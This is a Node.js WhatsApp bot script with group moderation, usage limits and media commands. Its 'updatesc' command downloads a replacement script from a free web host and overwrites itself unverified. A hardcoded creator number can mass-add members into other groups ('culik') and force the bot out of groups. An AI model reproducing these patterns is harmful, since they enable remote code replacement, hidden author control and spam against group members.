/**
 * versi 1.3
 */

require("./config");
require("./inn");
var QRCode = require("qrcode");
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = require("@adiwajshing/baileys");
const { lmenu, lantilink } = require("./src/text/id");
const fs = require("fs");
const util = require("util");
const https = require("https");
const chalk = require("chalk");
const { exec, spawn, execSync } = require("child_process");
const axios = require("axios");
const path = require("path");
const os = require("os");
const moment = require("moment-timezone");
const { JSDOM } = require("jsdom");
const speed = require("performance-now");
const server = require("./jadibot.js")
const { performance } = require("perf_hooks");
const primbon = require("scrape-primbon");
//const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
const {
  smsg,
  formatp,
  tanggal,
  formatDate,
  getTime,
  isUrl,
  sleep,
  runtime,
  fetchJson,
  getBRssDev,
  jsonformat,
  format,
  parseMention,
  getRandom,
  getGroupAdmins,
  mediafireDl,
  igDownloader,
  igstalk,
  verif134,
  sfileDl,
} = require("./lib/myfunc");

const sc_v = "3.4";
console.log(`Run RssDev.js`);

if (!verif134) return console.log("Modifikasi Terdeteksi");

// jadibot.data.start(RssDev, m, serder, chat) Start


try {
  low = require("./lib/lowdb");
} catch (e) {
  low = require("./lib/lowdb");
}
const { Low, JSONFile, LowSync, JSONFileSync } = low;
const db = new LowSync(new JSONFileSync("./db/db.json"));
function addlimit(no, limit) {
  db.read()
  let users = db.data.users[no]
  if (users) {
    users.limit += limit
    db.write()
    status = true
  }else{
    log = ceklimit(no)
    db.read()
    let users = db.data.users[no]
    users.limit += limit
    db.write()
    status = true
  }
  return status
}

function veriflimit(no){
    db.read()
    if(db.data.users[no].limit < 1) {
      status = true
    }else{
      status = false
    }    
    return status
}
function ceklimit(no) {
    db.read();             
    let users = db.data.users[no];
    if (users) {
      db.read();
      totallimit = users.limit
    } else {
      db.data.users[no] = {
        ban: false,
        moderator: false,
        vip: false,
        limit: 20,
        aktifgrup: 0,
        nama: '',
        warn: 0,
        verif: false,
        afk: -1,
        afkR: ""
      };
      db.write();
      db.read();
      totallimit = 20
    }
    return totallimit;
}

function removelimit(no, limit) {
  db.read()
  let users = db.data.users[no]
  if (users) {
    if(users.limit > 0){
      users.limit -= limit
      db.write()
      status = true
    }else{
      status = false
    }
  }else{
    log = ceklimit(no)
    db.read()
    let users = db.data.users[no]
    users.limit -= limit
    db.write()
    status = true
  }
  return status
}

function clockString(ms) {
    let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000)
    let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
    let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
function memberVIP(no){
  db.read()
  return db.data.users[no].vip
}
function Resetlimit(){
  db.read()
  arr = db.data.users
  for(let i in arr){
    json = db.data.users[i]
    console.log(i)
    arr[i].limit = 20
    db.write()
  }
  return true
}
function senderrorlog(RssDev, log){
  const sentMsg = RssDev.sendMessage('6285748411847@s.whatsapp.net', log);
}


module.exports = RssDev = async (RssDev, m, chatUpdate, store) => {
  try {
    var body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId ||
          m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
          m.text
        : "";
    var budy = typeof m.text == "string" ? m.text : "";
    var prefix = prefa
      ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
        ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
        : ""
      : prefa ?? global.prefix;
    const isCmd = body.startsWith(".");
    const command = body.replace(".", "").trim().split(/ +/).shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "No Name";
    const botNumber = await RssDev.decodeJid(RssDev.user.id);
    const isCreator = [botNumber, ...global.owner]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(m.sender);
    const itsMe = m.sender == botNumber ? true : false;
    const text = (q = args.join(" "));
    const fatkuns = m.quoted || m;
    const quoted =
      fatkuns.mtype == "buttonsMessage"
        ? fatkuns[Object.keys(fatkuns)[1]]
        : fatkuns.mtype == "templateMessage"
        ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]]
        : fatkuns.mtype == "product"
        ? fatkuns[Object.keys(fatkuns)[0]]
        : m.quoted
        ? m.quoted
        : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    const qmsg = quoted.msg || quoted;
    const isMedia = /image|video|sticker|audio/.test(mime);

    // Group
    const groupMetadata = m.isGroup
      ? await RssDev.groupMetadata(m.chat).catch((e) => {})
      : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";
    const participants = m.isGroup ? await groupMetadata.participants : "";
    const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const isCret = m.sender == "6285748411847@s.whatsapp.net";

    let messageLogger = []; //declare a variable to save message

    if (m.message) {
      if (global.autoread) {
        RssDev.readMessages([m.key]);
      }
      console.log(
        chalk.black(chalk.bgWhite("[ PESAN ]")),
        chalk.black(chalk.bgBlue(budy || m.mtype)) +
          "\n" +
          chalk.magenta("=> Dari"),
        chalk.green(pushname),
        chalk.yellow(m.sender) + "\n" + chalk.blueBright("=> Di"),
        chalk.green(m.isGroup ? pushname : "Private Chat", m.chat)
      );
    }
   // console.log(m)
    //For Database
    if (m.isGroup) {
      iddbchat = m.chat;
      db.read();
      let chats = db.data.chats[iddbchat];
      if (chats) {
        //console.log("Reading DB for "+ m.chat)
        db.read();
        db.data.chats[m.chat].totalmsg += 1
        db.write()
        //Warn
      } else {
        console.log("Add New Data Grup for user");
        db.data.chats[iddbchat] = {
          antilink: false,
          mute: false,
          vip: false,
          autodelete: false,
          warn: 0,
          totalmsg: 0,
          welcome: false,
          welcome_text: "Semoga Betah",
          asupan: false,
        };
        db.write();
        db.read();
      }
      db.read();            
      if (db.data.chats[m.chat].autodelete) {
        if (!isBotAdmins)
          throw `Fitur Auto delete Menyala, Bot Tidak Dapat menghapus pesan Karene Bukan admin`;
        let key = {};
        try {
          key.remoteJid = m.quoted
            ? m.quoted.fakeObj.key.remoteJid
            : m.key.remoteJid;
          key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe;
          key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id;
          key.participant = m.quoted
            ? m.quoted.fakeObj.participant
            : m.key.participant;
        } catch {
          reply("Tidak bisa menghapus pesan dari admin");
        }
        await RssDev.sendMessage(m.chat, { delete: key });
      }
    }
    
    const limituser = ceklimit(m.sender)
    
    if (m.isGroup) {
      if (db.data.chats[m.chat].antilink) {
        if (budy.match(`https://`) || budy.match(`http://`)) {
          m.reply(`${m.sender} Mengirim Link`);
          if (!isBotAdmins) return m.reply(`*Bot aja bukan admin`);
          let gclink =
            `https://chat.whatsapp.com/` +
            (await RssDev.groupInviteCode(m.chat));
          let isLinkThisGc = new RegExp(gclink, "i");
          let isgclink = isLinkThisGc.test(m.text);
          if (isgclink)
            return m.reply(
              `*maaf gak jadi, karena kamu ngirim link group ini*`
            );
          if (isAdmins) return m.reply(`*maaf kamu admin*`);
          if (isCreator) return m.reply(`*maaf kamu owner bot ku*`);
          //await RssDev.groupParticipantsUpdate(m.chat, [m.sender], "remove");
          await RssDev.sendMessage(m.chat, { delete: m.key });
        }
      }
    }
    
    
    //For filter
    
    
    
    
    
    
    

    /* if (d!isAdmins && !isCreator) {
      return
    }*/
    //console.log(isCmd);
    //AFK Fiture
    db.read()
    afkfg = db.data.users[m.sender]
    if(afkfg.afk > -1){
      m.reply(`Kamu Telah Berhenti AFK Selama ${clockString(new Date - afkfg.afk)} Karena ${afkfg.afkR}`)
      db.data.users[m.sender].afk = -1
      db.write()
    }
    
    db.read();
    db.data.users[m.sender].aktifgrup += 1
    db.write()
    
    
    switch (command) {
      //Main Menu
      case "resetalllimit":{
        if (!isCreator) throw `Khusus Owner`;
        db.read()
        user = Object.keys(db.data.users)
        for (let jid of user) db.data.users[jid].limit = 20
            await m.reply(`Reset Limit`)
            db.write()
      }      
      break
      case "afk": {
        db.read()
        db.data.users[m.sender].afk = +new Date
        if(!text){
          asd = "Gabut"
        }else{
          asd = text
        }
        db.data.users[m.sender].afkR = asd
        db.write()
        m.reply('Kamu Telah AfK')
      }
      break
      case "logs":
        {
          m.reply(`Segera`);
        }
        break;
      case "listdatagc":
        {
          db.read();
          rar = `Data Grup
antilink : ${db.data.chats[m.chat].antilink}
mute : ${db.data.chats[m.chat].mute}
autodelete : ${db.data.chats[m.chat].autodelete}
welcome : ${db.data.chats[m.chat].welcome}
vip : ${db.data.chats[m.chat].vip}
pelanggaran Grup : ${db.data.chats[m.chat].warn}
Pesan Grup : ${db.data.chats[m.chat].totalmsg}`;
          m.reply(rar);
        }
        break;
      case "updatesc":
        {
          if (!isCreator) throw `Khusus Owner`;
          const file = fs.createWriteStream("RssDev.js");

          const request = https.get(
            "https://todan.000webhostapp.com/A/RssDev.js",
            function (response) {
              response.pipe(file);

              file.on("finish", () => {
                file.close();

                console.log("Download Completed");

                m.reply("Update RssDev Script Selesai");
              });
            }
          );
        }
        break;
      case "delete":
      case "del":
        {
          if (!m.quoted) throw false;
          let { chat, fromMe, id, isBaileys } = m.quoted;
          if (!isBaileys) throw "Pesan tersebut bukan dikirim oleh bot!";
          RssDev.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: true,
              id: m.quoted.id,
              participant: m.quoted.sender,
            },
          });
        }
        break;
      case "gitclone":
        {
          if (!text) throw `Masukan URL`;
          let [usr, rep] = text.split`/`;
          let url = `https://api.github.com/repos/${encodeURIComponent(
            usr
          )}/${encodeURIComponent(rep)}/zipball`;
          let name = `${encodeURIComponent(rep)}.zip`;

          //RssDev.sendMedia(m.chat, url, name, null, m)
          //RssDev.sendFileUrl(m.chat, url, `text`, m)
          m.reply("Fitur Ini Belum Tersedia");
        }
        break;
      case "dell":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          let key = {};
          try {
            key.remoteJid = m.quoted
              ? m.quoted.fakeObj.key.remoteJid
              : m.key.remoteJid;
            key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe;
            key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id;
            key.participant = m.quoted
              ? m.quoted.fakeObj.participant
              : m.key.participant;
          } catch {
            reply("Tidak bisa menghapus pesan dari admin");
          }
          await RssDev.sendMessage(m.chat, { delete: key });
        }
        break;
      case "cekkey":
        {
          let anu = await fetchJson(
            "https://api.neoxr.my.id/api/check/" + global.keyneor
          );
          m.reply(`Cek api Key
neoxr : ${anu.status}`);
        }
        break;
      case "simi":
        {
          if (!text) throw `Masukan Text`;
          let anu = await fetchJson(
            "https://api.simsimi.net/v2/?text=" + text + "&lc=id"
          );
          m.reply(`Simi : ${anu.success}`);
          
        }
        break;

      case "getid":
        {
          await m.reply(`ID ${m.chat}`);
          
        }
        break;
      case "culik":
        {
          
          if (!isCret) throw "hanya untuk creator";
          if (!text) throw `Example : .culik <ID> <Time Sleep>`;
          idgrupnew = args[0];
          sleepnewproses = args[1];
          //await RssDev.groupUpdateSubject(idgrupnew + '@g.us', 'Menculik Member Akan segera di mulai')
          m.reply("Menculik...");

          await sleep(5);
          for (let mem of participants) {
            await sleep(sleepnewproses);
            console.log(mem.id);
            await RssDev.groupParticipantsUpdate(
              idgrupnew + "@g.us",
              [mem.id],
              "add"
            );
          }
        }
        break;
      case "infobot":
        {
          m.reply(`Nama Script : RssDev Bot
Versi Script : ${sc_v}
Tanggal Pembuatan : 18 September 2022
Informasi : Script Ini Di lengkapi Auto Update Engine
Jenis SC : Nodejs

Pengunaan Bot : Bot ini merespon pesan/Perintah dengan awalan .
`);
        }
        break;
      case "report":
        {
          //
          if (!text) throw "Tolong Tambahkan Kata/Pesan/Bug";

          //RssDev.sendText(m.chat, `Bug Report dari ${m.sender}.split('@')[0]${text}`)
          let buttons = [
            { buttonId: `Ban`, buttonText: { displayText: "Banned" }, type: 1 },
            { buttonId: `Ban`, buttonText: { displayText: "kick" }, type: 1 },
          ];
          let buttonMessage = {
            text: text,
            footer: "Bug Report",
            buttons: buttons,
            headerType: 2,
          };
          RssDev.sendMessage(global.ownere, buttonMessage);

          m.reply("Bug Telah Di laporkan ke Devoloper");
        }
        break;
      case "request":
        {
          //
          if (!text) throw "Silahkan Masukan Reques anda Bebas mau request apa";

          //RssDev.sendText(m.chat, `Bug Report dari ${m.sender}.split('@')[0]${text}`)
          let buttons = [
            { buttonId: `bsuehndd ${m.sender.split("@")[0]} 1`, buttonText: { displayText: "Terima" }, type: 1 },
            { buttonId: `bsuehndd ${m.sender.split("@")[0]} 0`, buttonText: { displayText: "Tolak" }, type: 1 },
          ];
          let buttonMessage = {
            text: text,
            footer: "Request Fitur",
            buttons: buttons,
            headerType: 2,
          };
          RssDev.sendMessage(global.ownere, buttonMessage);

          m.reply("Request Telah Di Kirim ke Devoloper Untuk di Tinjau");
        }
        break;
      case "bsuehndd": {
          nomer = args[0] + "@s.whatsapp.com";
          if (args[1] === 1) {
            const sentMsg = await RssDev.sendMessage(nomer, "Permintaan Anda Telah Di Terima Devoloper");
            senderrorlog(RssDev, sentMsg)
          } else if (args[1] === 0) {
            const sentMsg = await RssDev.sendMessage(nomer, "Permintaan Anda Telah Di Tolak Oleh Devoloper");
            senderrorlog(RssDev, sentMsg)
          }
      }
      break
      case "sc":
        {
          //
          let btn = [
            {
              urlButton: {
                displayText: "Creator",
                url: "https://wa.me/6285748411847",
              },
            },
            {
              quickReplyButton: {
                displayText: "Menu",
                id: "menu",
              },
            },
            {
              quickReplyButton: {
                displayText: "Contact Owner/Creator",
                id: "creator",
              },
            },
          ];
          let txt = `Silahkan Minta Creator`;
          m.reply(txt);
          //await RssDev.send5ButImg(m.chat, txt, RssDev.user.name, global.thumb, btn);
        }
        break;
      case "owner":
      case "creator":
        {
          teks = `Informasi owner dan Creator SC
♦Creator Script
Wa : wa.me/6285748411847 

♦Owner Bot
Wa : wa.me/${global.owner1}

♦Link Grup.Bot
Wa : https://chat.whatsapp.com/FvH5cGhzOGaFs8OC15bu68`;
          let buttons = [
            { buttonId: `.menu`, buttonText: { displayText: "Menu" }, type: 1 },
            {
              buttonId: `qcreatorig`,
              buttonText: { displayText: "Instagram Creator" },
              type: 1,
            },
            {
              buttonId: `creatorfb`,
              buttonText: { displayText: "Facebook Creator" },
              type: 1,
            },
          ];
          let buttonMessage = {
            text: teks,
            footer: "Informasi Owner Dan Creator",
            buttons: buttons,
            headerType: 2,
          };
          RssDev.sendMessage(m.chat, buttonMessage);
          await sleep(1);
          const vcard =
            "BEGIN:VCARD\n" + // metadata of the contact card
            "VERSION:3.0\n" +
            "FN:RssDevoloper\n" + // full name
            "ORG:Devoloper;\n" + // the organization of the contact
            "TEL;type=CELL;type=VOICE;waid=+6285748411847:+6285748411847\n" + // WhatsApp ID + phone number
            "END:VCARD";
          const sentMsg = await RssDev.sendMessage(m.chat, {
            contacts: { displayName: "RssDev", contacts: [{ vcard }] },
          });
        }
        break;
      case "menu":
        {
          m.reply(`Halo ${m.sender.split("@")[0]}
Limit anda Tinggal : ${limituser}

➢Daftar Menu Yg Tersedia

┌─(♦Menu Grup)
│.add <NO>
│.kick <NO>
│.tagall
│.hidetag <Text>
│.setname <Text>
│.setdesc <Text>
│.join <Link Grup>
│.keluar
│.totag 
│.warn ( bug )
│.editinfo
│.tagadmin
│.antilink
│.autodelete
│.listdatagc
│.setwelcome
│.welcome <Text>
│.demote
│.linkgc
└─────────◉
┌──(♦Main Menu)
│.menu
│.afk
│.liston
│.simi <Pesan Anda>
│.owner / creator
│.infobot
│.delete 
│.report <Text Bug/Error> 
│.logs
└───────⭓
┌──(♦Owner Menu)
│.updatesc ( Untuk Update Engine )
│.bcgroup <Text>
│.culik <ID Grup Baru>
│.getid 
│.resetalllimit
│.dell ( Hapus Pesan User )
│.del ( Hapus Pesan Bot )
└───────⭓
┌──⭓(♦Pencarian)
│.play <Query>
│.gimage <Query>
│.meme
│.walpaper <Query>
│.waifu
│.loli
│.cosplay
│.emojimix <Emoji>+<Emoji> ( 😂+😇 )
└───────⭓
┌──⭓(♦Download))
│.ytmp4 <Link> ( bug )
│.ytmp3 <Link> ( bug )
│.ssweb <Link>
│.tiktok <Link>
│.ig <Link>
└───────⭓
┌──⭓(♦Tool)
│.readmore <Text>|<Text>
└───────⭓
┌──⭓(♦Primbon)
│.artinama <Nama>
└───────⭓
┌──⭓(♦Islami)
│.doaharian
│.bacaansholat
│.asmaulhusna
└───────⭓
┌──⭓(♦Random)
│.truth
│.renungan
│.dare
│.motivasi
│.apakah <Pertanyaan> ( Random )
│.bucin
└───────⭓
┌──⭓(♦Media)
│.s
│.toimg
│.tomp3
│.tovideo
│.toaudio
│.togif
│.tovn
│.tourl
└───────⭓

`);
        }
        break;

      //List Menu Grop
      case "ssweb":
        {
          if(!removelimit(m.sender, 1)) throw mess.limit;
          let anu = await getBRssDev(
            "https://api.neoxr.my.id/api/ss?url=" +
              text +
              "&apikey=" +
              global.keyneor
          );
          RssDev.sendMessage(
            m.chat,
            { image: anu, caption: `Selesai` },
            { quoted: m }
          );
        }
        break;
      case "waifu":
        {
          if(!removelimit(m.sender, 1)) throw mess.limit;
          let anu = await fetchJson("https://api.waifu.pics/sfw/waifu");
          RssDev.sendMessage(
            m.chat,
            { image: { url: anu.url }, caption: `Selesai` },
            { quoted: m }
          );
        }
        break;
      case "loli":
        {
          if(!removelimit(m.sender, 1)) throw mess.limit;
          let url = global.loli[Math.floor(Math.random() * global.loli.length)]
          RssDev.sendMessage(
            m.chat,
            { image: { url: url }, caption: `Selesai` },
            { quoted: m }
          );
        }
        break;
      case "motivasi":
        {
          let url = global.motivasi[Math.floor(Math.random() * global.motivasi.length)]
          m.reply(url)
        }
        break;
      case "cosplay":
        {
          if(!removelimit(m.sender, 1)) throw mess.limit;
          let url = global.cosplay[Math.floor(Math.random() * global.cosplay.length)]
          RssDev.sendMessage(
            m.chat,
            { image: { url: url }, caption: `Selesai` },
            { quoted: m }
          );
        }
        break;
      case "artinama":
        {
          if(!removelimit(m.sender, 1)) throw mess.limit;
          let anu = await fetchJson(
            "https://api.neoxr.my.id/api/artinama?nama=" +
              text +
              "&apikey=" +
              global.keyneor
          );
          //m.reply(anu.data);
          m.reply(anu.data.arti);
        }
        break;
      case "katabijak":
        {
          let anu = await fetchJson(
            "https://api.arugaz.my.id/api/random/text/katabijak"
          );
          //m.reply(anu.data);
          m.reply(anu.result);
        }
        break;

      case "walpaper":
        {
          if(!removelimit(m.sender, 1)) throw mess.limit;
          let anu = await fetchJson(
            "https://api.neoxr.my.id/api/wallpaper2?q=" +
              text +
              "&apikey=" +
              global.keyneor
          );
          if (anu.status == true) {
            ar = anu.data[Math.floor(Math.random() * anu.data.length)];

            await RssDev.sendMessage(
              m.chat,
              { image: { url: ar.url }, caption: `Selesai` },
              { quoted: m }
            );
          } else {
            m.reply(
              "maaf, Terjadi Kesalahan, silahkan hubungi owner code: " +
                anu.status
            );
          }
        }
        break;
      case "jadibot":{
        if (!isCreator) throw mess.owner;
        server.data.start(m.sender.split('@')[0])
        m.reply("running..")
      }
      break
      case "autodelete":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          if (args[0] === "on") {
            if (db.data.chats[m.chat].autodelete)
              return m.reply(`*Sudah Aktif kak Sebelumnya*`);
            db.data.chats[m.chat].autodelete = true;
            m.reply(`*Autodelete Sekarang Aktif !*`);
            db.write();
          } else if (args[0] === "off") {
            if (!db.data.chats[m.chat].autodelete)
              return m.reply(`*Sudah Tidak Aktif Sebelumnya*`);
            db.data.chats[m.chat].autodelete = false;
            m.reply(`*Autodelete Sekarang Tidak Aktif !*`);
            db.write();
          } else {
            let buttons = [
              {
                buttonId: "autodelete on",
                buttonText: { displayText: "On" },
                type: 1,
              },
              {
                buttonId: "autodelete off",
                buttonText: { displayText: "Off" },
                type: 1,
              },
            ];
            await RssDev.sendButtonText(
              m.chat,
              buttons,
              `Mode autodelete Semua Pesan`,
              RssDev.user.name,
              m
            );
          }
        }
        break;

      case "editinfo":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          if (args[0] === "open") {
            await RssDev.groupSettingUpdate(m.chat, "unlocked")
              .then((res) => m.reply(`Sukses Membuka Edit Info Group`))
              .catch((err) => m.reply(jsonformat(err)));
          } else if (args[0] === "close") {
            await RssDev.groupSettingUpdate(m.chat, "locked")
              .then((res) => m.reply(`Sukses Menutup Edit Info Group`))
              .catch((err) => m.reply(jsonformat(err)));
          } else {
            let buttons = [
              {
                buttonId: "editinfo open",
                buttonText: { displayText: "Open" },
                type: 1,
              },
              {
                buttonId: "editinfo close",
                buttonText: { displayText: "Close" },
                type: 1,
              },
            ];
            await RssDev.sendButtonText(
              m.chat,
              buttons,
              `Mode Edit Info`,
              RssDev.user.name,
              m
            );
          }
        }
        break;
      case "totag":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          if (!m.quoted) throw `Reply pesan dengan caption ${prefix + command}`;
          RssDev.sendMessage(m.chat, {
            forward: m.quoted.fakeObj,
            mentions: participants.map((a) => a.id),
          });
        }
        break;

      case "tagall":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          let teks = `══✪〘 *👥 Tag All* 〙✪══ 
➲ *Pesan : ${q ? q : "kosong"}*\n\n`;
          for (let mem of participants) {
            teks += `♦ @${mem.id.split("@")[0]}\n`;
          }
          RssDev.sendMessage(
            m.chat,
            { text: teks, mentions: participants.map((a) => a.id) },
            { quoted: m }
          );
        }
        break;
      case "emojimix":
        { 
          if(!removelimit(m.sender, 1)) throw mess.limit;
          let [emoji1, emoji2] = text.split`+`;
          if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`;
          if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`;
          let anu = await fetchJson(
            `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(
              emoji1
            )}_${encodeURIComponent(emoji2)}`
          );
          for (let res of anu.results) {
            let encmedia = await RssDev.sendImageAsSticker(m.chat, res.url, m, {
              packname: global.packname,
              author: global.author,
              categories: res.tags,
            });
            await fs.unlinkSync(encmedia);
          }
        }
        break;
      case "bucin":
      case "truth":
      case "renungan":
      case "dare":
        {
          rawdata = fs.readFileSync(`./db/${command}.json`);
          let datajson = JSON.parse(rawdata);
          hasil = datajson[Math.floor(Math.random() * datajson.length)];
          m.reply(hasil);
        }
        break;
      case "apakah":
        {
          if (!text) throw `Masukkan Pesan`
          rawdata = ["Iya","Tidak","Mungkin iya","Mungkin tidak","Saya tidak tau","Tanya Dia sendiri"]
          let hasil = rawdata[Math.floor(Math.random() * rawdata.length)]         
          m.reply(`*Pertanyaan :* ${text}
*jawaban :* ${hasil}`);
        }
        break;
      case "asmaulhusna":
        {
          rawdata = fs.readFileSync("./db/function/Asmaulhusna.json");
          let datajson = JSON.parse(rawdata);
          hasil = datajson[Math.floor(Math.random() * datajson.length)];
          m.reply(`Asmaul Husna
Latin : ${hasil.latin}
Arab : ${hasil.arabic}
Terjemahan :  ${hasil.translation_id}
`);
        }
        break;
      case "bacaansholat":
        {
          rawdata = fs.readFileSync("./db/function/Bacaansholat.json");
          let datajson = JSON.parse(rawdata);
          hasil = datajson[Math.floor(Math.random() * datajson.length)];
          m.reply(`Bacaan Sholat
Latin : ${hasil.latin}
Arab : ${hasil.arabic}
Terjemahan :  ${hasil.translation_id}
`);
        }
        break;
      case "doaharian":
        {
          rawdata = fs.readFileSync("./db/function/Doaharian.json");
          let datajson = JSON.parse(rawdata);
          hasil = datajson[Math.floor(Math.random() * datajson.length)];
          m.reply(`Doa Harian
Latin : ${hasil.latin}
Arab : ${hasil.arabic}
Terjemahan :  ${hasil.translation_id}
`);
        }
        break;
      case "Asmaulhusna":
        {
          rawdata = fs.readFileSync("./db/function/Asmaulhusna.json");
          let datajson = JSON.parse(rawdata);
          hasil = datajson[Math.floor(Math.random() * datajson.length)];
          m.reply(hasil);
        }
        break;

      case "join":
        {
          if (!isCreator) throw mess.owner;
          if (!text) throw "Masukkan Link Group!";
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            throw "Link Invalid!";
          m.reply(mess.wait);
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          await RssDev.groupAcceptInvite(result)
            .then((res) => m.reply(jsonformat(res)))
            .catch((err) => m.reply(jsonformat(err)));
        }
        break;
      case "keluar":
        {
          if (!isCreator) throw mess.owner;
          if (!m.isGroup) throw mess.group;
          await RssDev.groupLeave(m.chat)
            .then((res) => m.reply(jsonformat(res)))
            .catch((err) => m.reply(jsonformat(err)));
        }
        break;
      case "linkgroup":
      case "linkgc":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          let response = await RssDev.groupInviteCode(m.chat);
          RssDev.sendText(
            m.chat,
            `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`,
            m,
            { detectLink: true }
          );
        }
        break;
      case "testgc":{
        // send a link
        const sentMsg  = await RssDev.sendMessage(m.chat, { text: 'Hi, this was sent using https://github.com/adiwajshing/baileys' })
        console.log("group code: " + sentMsg)
      }
      break
      case "tagadmin":{
        if (!m.isGroup) throw mess.group;
        //m.reply(groupAdmins)
        RssDev.sendMessage(m.chat, { text: text ? text : "Panggilan", mentions: groupAdmins }, { quoted: m });
      }
      break
      case "hidetag":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          RssDev.sendMessage(
            m.chat,
            { text: q ? q : "", mentions: participants.map((a) => a.id) },
            { quoted: m }
          );
        }
        break;
      case "setname":
      case "setsubject":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          if (!text) throw "Text ?";
          await RssDev.groupUpdateSubject(m.chat, text)
            .then((res) => m.reply(mess.success))
            .catch((err) => m.reply(jsonformat(err)));
        }
        break;
      case "setdesc":
      case "setdesk":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          if (!text) throw "Text ?";
          await RssDev.groupUpdateDescription(m.chat, text)
            .then((res) => m.reply(mess.success))
            .catch((err) => m.reply(jsonformat(err)));
        }
        break;
      case "antilink":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          if (args[0] === "on") {
            if (db.data.chats[m.chat].antilink)
              return m.reply(`*Sudah Aktif kak Sebelumnya*`);
            db.data.chats[m.chat].antilink = true;
            m.reply(`*Antilink Sekarang Aktif !*`);
            db.write();
          } else if (args[0] === "off") {
            if (!db.data.chats[m.chat].antilink)
              return m.reply(`*Sudah Tidak Aktif Sebelumnya*`);
            db.data.chats[m.chat].antilink = false;
            m.reply(`*Antilink Sekarang Tidak Aktif !*`);
            db.write();
          } else {
            let buttons = [
              {
                buttonId: "antilink on",
                buttonText: { displayText: "On" },
                type: 1,
              },
              {
                buttonId: "antilink off",
                buttonText: { displayText: "Off" },
                type: 1,
              },
            ];
            await RssDev.sendButtonText(
              m.chat,
              buttons,
              `Mode All link`,
              RssDev.user.name,
              m
            );
          }
        }
        break;
      case "warngc":
        {
          if (!text) throw `warngc <ID GRUP>`;
          if (!isCret) throw `Anda Tidak Di izinkan Untuk Melakukan Ini`;
          db.read();
          jumlah = db.data.chats[m.chat].warn;
          if (jumlah == 3) {
            if (!m.isGroup) return (j2344h = 5);
            await RssDev.groupLeave(args[0]);
          } else {
            db.data.chats[m.chat].warn = jumlah + 1;
            db.write();
          }
          db.read();
          jumlah = db.data.chats[m.chat].warn;
          agg = `Peringatan Untuk Admin Grup Anda
Grup Anda mendapat Peringatan Dari Creator

Peringatan Grup ${jumlah}/3

*Note : Jika Peringatan Mencapai 3x maka Bot akan Keluar dan Tidak Dpt di tambahkan lagi ke grup, Alasan Peringatan Tanyakan ke Creator`;
          let buttons = [
            { buttonId: "menu", buttonText: { displayText: "menu" }, type: 1 },
            {
              buttonId: "creator",
              buttonText: { displayText: "creator" },
              type: 1,
            },
          ];
          await RssDev.sendButtonText(
            args[0],
            buttons,
            agg,
            RssDev.user.name,
            m
          );
        }
        break;
      case "warn":{
